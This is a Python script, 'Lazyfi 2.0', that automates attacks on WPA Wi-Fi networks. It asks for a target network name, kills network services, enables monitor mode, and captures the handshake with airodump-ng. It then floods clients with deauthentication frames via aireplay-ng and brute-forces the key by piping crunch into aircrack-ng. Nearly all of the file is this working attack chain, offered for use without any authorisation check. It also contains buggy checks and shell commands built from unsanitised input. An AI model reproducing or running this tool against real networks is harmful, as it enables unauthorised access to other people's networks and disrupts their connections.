#!/bin/python3
#Lazyfi 2.0

#imports here
import time
import os
import glob
import getpass
import netifaces
from subprocess import check_output
from threading import Thread
from termcolor import colored


#check for root access
def check_root():
    os.system("clear")
    username = getpass.getuser()
    if username != 'root':
        print(colored("Please run As root",'red'))
        quit()
    else:
        print(colored("Script Has root Access","green"))
        time.sleep(2)
        check_install()

#check if the script is installed
def check_install():
    directory = os.path.isdir("/bin/Lazyfi") 
    if directory == True:
        banner()
    else:
        print(colored("Script Is Not Installed...","red"))
        time.sleep(2)
        print(colored("Do You Want To Install The Script?","blue"))
        time.sleep(2)
        usrrspns = input(colored("Lazyfi(Y/N): ","blue"))
        if usrrspns == 'y':
            install_script()
        elif usrrspns == 'n':
            banner()
        else:
            print(colored("Please Give Proper Input..."))
            time.sleep(1)
            check_install()
#install script
def install_script():
    print(colored("What Is Your Username?","blue"))
    time.sleep(2)
    username = input(colored("Lazyfi: ","blue"))
    print(colored("Now Installing Script....","yellow"))
    time.sleep(2)
    os.system("echo 'sudo python3 /bin/Lazyfi/Lazyfi.py' >> lazyfi")
    os.system("mkdir /bin/Lazyfi")
    dire = os.popen("pwd").read().rstrip()
    os.system("cp {}/* /bin/Lazyfi".format(dire))
    os.system("chmod +x /bin/Lazyfi/lazyfi")
    print(colored("Coping Done!","green"))
    time.sleep(2)
    print(colored("Editing Path Variable So the Script Can be Run From Terminal"))
    time.sleep(2)
    os.system("export PATH=$PATH:/bin/Lazyfi")
    if username == 'root':
        os.system("echo 'export PATH=$PATH:/bin/Lazyfi' >> ~/.bashrc")
    else:
        os.system("echo 'export PATH=$PATH:/bin/Lazyfi' >> /home/{}/.bashrc".format(username))
    print(colored("Succesfully Installed Lazyfi...","green"))
    time.sleep(2)
    print(colored("Open New Terminal And Type lazyfi To Run The Script Anytime...","green"))
    time.sleep(2)
    os.system("rm lazyfi")
    banner()
    
#banner
def banner():
    os.system("clear")
    print(colored("**********************************","blue"))
    print(colored("*   _                     __ _   *","blue"))
    print(colored("*  | |    __ _ _____   _ / _(_)  *","blue"))
    print(colored("*  | |   / _` |_  / | | | |_| |  *","blue"))
    print(colored("*  | |__| (_| |/ /| |_| |  _| |  *","blue"))
    print(colored("*  |_____\__,_/___|\__, |_| |_|  *","blue"))
    print(colored("*                  |___/         *","blue"))
    print(colored("*                        v 2.0   *","blue"))
    print(colored("**********************************","blue"))
    print(colored("*[1] Automatic Mode              *","blue"))
    print(colored("*[2] Manual Mode                 *","blue"))
    print(colored("*[3] Clear                       *","blue"))
    print(colored("*[4] Exit                        *","blue"))
    print(colored("**********************************","blue"))
    response = input(colored("Lazy: ","blue"))
    if response == '1':
        check_interface()
    elif response == '2':
        manual()
    elif response == '3':
        clear()
    elif response == '4':
        os.system("clear")
        quit()
    else:
        print(colored("Please Give A Valid Input...","red"))
        time.sleep(2)
        banner()
#####################
#FULL AUTOMATIC MODE#
#####################
     
#check if wlan0 available                                                                                                                                                      
def check_interface():                                                                                                                                                         
    global wifi                                                                                                                                                                 
    global inte                                                                                                                                                                         
    wifi = input(colored("Name OF WIFI To HACk: ","blue"))                                                                                                                      
    #os.system("clear")                                                                                                                                                        
    interface = netifaces.interfaces()                                                                                                                                         
    inte = interface[2]                                                                                                                                                         
    if 'wlan0' or 'wlan0mon' in interface:                                                                                                                                     
        print(colored("Wifi Adepter Found...","green"))                                                                                                                        
        time.sleep(2)                                                                                                                                                               
        print(colored("Your Interface is {}","green").format(inte))                                                                                                                     
        time.sleep(2)                                                                                                                                                          
        if inte == 'wlan0mon':                                                                                                                                                  
            print(colored("Monitor Mode IS Already ON","green"))                                                                                                                    
            time.sleep(2)                                                                                                                                                       
            callem()                                                                                                                                                            
        else:                                                                                                                                                                  
            start_mon()                                                                                                                                                        
    else:                                                                                                                                                                       
        print(colored("No Wifi Adepter Found. Please Insert Your Adepter And Run Again!","red"))                                                                                
        quit()                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                                                                               # 
#start monitor mode                                                                                                                                                            
def start_mon():                                                                                                                                                                                
    global netman                                                                                                                                                                                                           
    global wpas                                                                                                                                                                                                 
    global dhcl                                                                                                                                                                                                     
    global inte                                                                                                                                                                                             
    print(colored("Finding processes that could cause trouble...","yellow"))                                                                                                                                                
    time.sleep(2)                                                                                                                                                                                   
    try:                                                                                                                                                                                                        
        netmanager = check_output(["pidof","NetworkManager"]).decode("ascii").rstrip()                                                                                                                                      
        print(colored("Found NetworkManager: {}","red").format(netmanager))                                                                                                                                         
        time.sleep(2)                                                                                                                                                                                               
        print(colored("Killing Process","yellow"))                                                                                                                                                                          
        os.system("kill {}".format(netmanager))                                                                                                                                                                                                 
        time.sleep(2)                                                                                                                                                                                               
    except:                                                                                                                                                                                                                         
        print(colored("NetworkManager Not Found...","green"))                                                                                                                                                                                                                                                                                                                                                                                                             
        time.sleep(2)                                                                                                                                                                                                          
    try:                                                                                                                                                                                                                                                                       
        wpa        = check_output(["pidof","wpa_supplicant"]).decode("ascii").rstrip()                                                                                                                                                     
        print(colored("Found wpa_supplicant: {}","red").format(wpa))                                                                                                                                                       
        time.sleep(2)                                                                                                                                                                                          
        print(colored("Killing Process","yellow"))                                                                                                                                                                     
        os.system("kill {}".format(wpa))                                                                                                                                                                                       
        time.sleep(2)                                                                                                                                                                                                              
    except:                                                                                                                                                                                                            
        print(colored("wpa_supplicant Not Found","green"))                                                                                                                                                                                                                                                                                                                                                                                                     
        time.sleep(2)                                                                                                                                                                                   
    try:                                                                                                                                                                                                                
        dhc        = check_output(["pidof","dhclient"]).decode("ascii").rstrip()                                                                                                                                        
        print(colored("Found dhclient: {}","red").format(dhc))                                                                                                                                                  
        time.sleep(2)                                                                                                                                                                                           
        print(colored("Killing Process","yellow"))                                                                                                                                                                              
        os.system("kill {}".format(dhc))                                                                                                                                                                                                    
        time.sleep(2)                                                                                                                                                                                                       
    except:                                                                                                                                                                                                             
        print(colored("dhclient Not Found","green"))                                                                                                                                                                                                                                                                                                                                                                                            
        time.sleep(2)                                                                                                                                                                                                   
    print(colored("Changing Interface To wlan0mon For Monitor Mode","yellow"))                                                                                                                                                                      
    time.sleep(2)                                                                                                                                                                                                                   
    os.system("airmon-ng start {}".format(inte))                                                                                                                                                                                                            
    time.sleep(2)                                                                                                                                                                                                               
    callem()                                                                                                                                                                                            
                                                                                                                                                                                
#call start and stop of airodump-ng                                                                                                                                                                         
def callem():                                                                                                                                                                                   
    Thread(target = start_monitoring).start()                                                                                                                                               
    time.sleep(5)                                                                                                                                                               
    Thread(target = stop_monitoring).start()                                                                                                                                    
                                                                                                                                                                                        
#checks for given wifi                                                                                                                                                          
def start_monitoring():                                                                                                                                                             
    global wifi                                                                                                                                                                             
    global change_inte                                                                                                                                                                          
    chnage_interface = netifaces.interfaces()                                                                                                                                                                   
    change_inte = chnage_interface[2]                                                                                                                                                                       
    #os.system("clear")                                                                                                                                                                                                     
    print(colored("Now Searching For {}","yellow").format(wifi))                                                                                                                                                            
    time.sleep(2)                                                                                                                                                                                                               
    os.system("xterm -bg black -fg brown -e 'airodump-ng {} -w nearby'".format(change_inte))                                                                                                                                    
    get_wifi_details()                                                                                                                                                                                              
                                                                                                                                                                                
#stops monitoring                                                                                                                                                                                                            
def stop_monitoring():                                                                                                                                                                                               
    pid = os.popen("pgrep -n xterm").read().rstrip()                                                                                                                                                                         
    time.sleep(25)                                                                                                                                                                                                           
    os.system("kill {}".format(pid))                                                                                                                                                                                             
                                                                                                                                                                                                            
#get bssid channel of wifi                                                                                                                                                                                                  
def get_wifi_details():                                                                                                                                                                                                         
    global wifi                                                                                                                                                                                                             
    global bssid                                                                                                                                                                                                        
    global channel                                                                                                                                                                                                      
    myhash = {}                                                                                                                                                                                                             
    myhash['id'] = str(wifi)                                                                                                                                                                        
    print(colored("Getting wifi Details Please Wait...","yellow"))                                                                                                                
    time.sleep(2)                                                                                                                                                                 
    channel = os.popen("cat nearby-01.csv | grep %(id)s | awk '{ print $6 }' | cut -d ',' -f 1" % myhash).read().rstrip()                                                      
    bssid = os.popen("cat nearby-01.csv | grep %(id)s | awk '{ print $1 }' | cut -d ',' -f 1" % myhash).read().rstrip()                                                         
    print(colored("BSSID: {}","green").format(bssid))                                                                                                                             
    time.sleep(1)                                                                                                                                                                             
    print(colored("Channel: {}","green").format(channel))                                                                                                                          
    time.sleep(2)                                                                                                                                                                         
    os.system("rm nearby-01.*")                                                                                                                                                   
    start_hack()                                                                                                                                                                  
                                                                                                                                                                                  
#start airodump-ng                                                                                                                                                                
def airod():                                                                                                                                                                    
    global bssid                                                                                                                                                                  
    global channel                                                                                                                                                                        
    global wifi                                                                                                                                                                       
    global change_inte                                                                                                                                                            
    print(colored("Waiting For Handshake....DO NOT CLOSE IT","yellow"))                                                                                                           
    time.sleep(2)                                                                                                                                                                     
    os.system("xterm -bg black -fg brown -e 'airodump-ng --bssid {} --channel {} --write {} {}'".format(bssid,channel,wifi,change_inte))
    restart()                                       

#restart all services that were killed
def restart():
    print(colored("Changing Interface Back To wlan0","yellow"))
    time.sleep(2)
    os.system("airmon-ng stop wlan0mon")
    try:                                                                                                                                                                                                        
        netmanager = check_output(["pidof","NetworkManager"]).decode("ascii").rstrip()                                                                                                                                      
        print(colored("NetworkManager Is Running","green"))                                                                                                                                         
        time.sleep(2)                                                                                                                                                                                                                                                            
    except:                                                                                                                                                                                                                         
        print(colored("Restarting NetworkManager...","yellow"))                                                                                                                                                                                           
        time.sleep(2)
        os.system("service NetworkManager restart")     
    try:                                                                                                                                                                                                        
        wpa = check_output(["pidof","wpa_supplicant"]).decode("ascii").rstrip()                                                                                                                                      
        print(colored("wpa_supplicant Is Running","green"))                                                                                                                                         
        time.sleep(2)                                                                                                                                                                                                                                                            
    except:                                                                                                                                                                                                                         
        print(colored("Restarting wpa_supplicant...","yellow"))                                                                                                                                                                                           
        time.sleep(2)
        os.system("service wpa_supplicant restart") 
    try:                                                                                                                                                                                                        
        dhc = check_output(["pidof","dhclient"]).decode("ascii").rstrip()                                                                                                                                      
        print(colored("dhclient Is Running","green"))                                                                                                                                         
        time.sleep(2)                                                                                                                                                                                                                                                            
    except:                                                                                                                                                                                                                         
        print(colored("Restarting dhclient...","yellow"))                                                                                                                                                                                           
        time.sleep(2)
        os.system("service dhclient restart") 
    pass_crack()                                                                                                                                                                                    
                                                                                                                                                                            
#starts deauth                                                                                                                                                                        
def deauth():                                                                                                                                                                             
    global bssid                                                                                                                                                               
    global change_inte                                                                                                                                                            
    os.system("xterm -bg black -fg brown -e 'aireplay-ng -0 200 -a {} --ignore-negative-one {}'".format(bssid,change_inte))                                                           
    kill_airod()                                                                                                                                                                              
                                                                                                                                                                                      
#stops airod window                                                                                                                                                                   
def kill_airod():                                                                                                                                                                             
    pid = os.popen("pgrep -n xterm").read().rstrip()                                                                                                                              
    time.sleep(1)                                                                                                                                                              
    os.system("kill {}".format(pid))                                                                                                                                           
                                                                                                                                                                               
#starts airodump and aircrack                                                                                                                                                     
def start_hack():                                                                                                                                                                                         
    Thread(target = airod).start()                                                                                                                                                    
    time.sleep(10)                                                                                                                                                                                    
    Thread(target = deauth).start()                                                                                                                                                       
                                                                                                                                                                                  
#crack password                                                                                                                                                                   
def pass_crack():                                                                                                                                                                                   
    global wifi                                                                                                                                                                               
    global bssid                                                                                                                                                                                     
    lower="abcdefghijklmnopqrstuvwxyz"                                                                                                                                            
    upper="ABCDEFGHIJKLMNOPQRSTUVWXYZ"                                                                                                                                            
    number="0123456789"                                                                                                                                                           
    #symbol="@_-$#%&"   
    myhash = {}
    myhash['l'] = str(lower)
    myhash['u'] = str(upper)
    myhash['n']   = str(number)
    #myhash['s']   = str(symbol)
    myhash['w'] = str(wifi)
    myhash['b']   = str(bssid)                                                                                                                                           
    print(colored("Now Trying To Crack The Password...It Can Take A Long Time Depending On The Password..","yellow"))                                                          
    time.sleep(2)      
    print(colored("Use ctrl + c To Stop Cracking In Case You Want To Use A Wordlist","green"))                                                                                                                                                             
    os.system("xterm -hold -bg black -fg brown -e 'crunch 6 16 %(l)s%(u)s%(n)s | aircrack-ng -a 2 %(w)s-01.cap -w- -b %(b)s'" %myhash)        
    print(colored("Done!","green"))                                                                                                                                               
    time.sleep(2)          
    print(colored("All Files Are Left As It Is For Further Uses. Clean Them From The Main Menu!","green"))  
    time.sleep(2)                                                                                                                                            
    banner()                                                                                                                                                                                                   


##################   
#clear everything#                   
##################
def clear():
    print(colored("Clearing Up All Files....","yellow"))
    time.sleep(2)

    cap = glob.glob("*.cap")        #list all cap files
    csv = glob.glob("*.csv")        #list all csv files
    netxml = glob.glob("*.netxml")  #list all netxml files

    cap_i = 0
    csv_i = 0
    netxml_i = 0
    #delete all cap files
    while cap_i < len(cap):
        os.system("rm {}".format(cap[cap_i]))
        cap_i+=1
    if len(cap) == 0:
        print("No cap File Found...","red")
        time.sleep(2)
    #delete all csv files
    while csv_i < len(csv):
        os.system("rm {}".format(csv[csv_i]))
        csv_i+=1
    if len(csv) == 0:
        print("No csv File Found...","red")
        time.sleep(2)
    #delete all netxml files
    while netxml_i < len(netxml):
        os.system("rm {}".format(netxml[netxml_i]))
        netxml_i+=1
    if len(netxml) == 0:
        print("No netxml File Found...","red")
        time.sleep(2)

    print(colored("Done!","green"))
    time.sleep(2)
    banner()

#####################
#    MANUAL MOOD   #
#####################
def manual():
    os.system("clear")
    print(colored("**********************************","blue"))
    print(colored("*   _                     __ _   *","blue"))
    print(colored("*  | |    __ _ _____   _ / _(_)  *","blue"))
    print(colored("*  | |   / _` |_  / | | | |_| |  *","blue"))
    print(colored("*  | |__| (_| |/ /| |_| |  _| |  *","blue"))
    print(colored("*  |_____\__,_/___|\__, |_| |_|  *","blue"))
    print(colored("*                  |___/         *","blue"))
    print(colored("*                        v 2.0   *","blue"))
    print(colored("**********************************","blue"))
    print(colored("*[1] Enable Monitor Mode         *","blue"))
    print(colored("*[2] Search For Networks         *","blue"))
    print(colored("*[3] Get Handshake               *","blue"))
    print(colored("*[4] Crack Password              *","blue"))
    print(colored("*[5] Restore Network Services    *","blue"))
    print(colored("*[6] Go Back                     *","blue"))
    print(colored("*[7] Exit                        *","blue"))
    print(colored("**********************************","blue"))
    response = input(colored("Lazy: ","blue"))
    if response == '1':
        pass
    elif response == '2':
        pass
    elif response == '3':
        pass
    elif response == '4':
        pass
    elif response == '5':
        pass
    elif response == '6':
        banner()
    elif response == '7':
        os.system("clear")
        quit()
#call functions
check_root()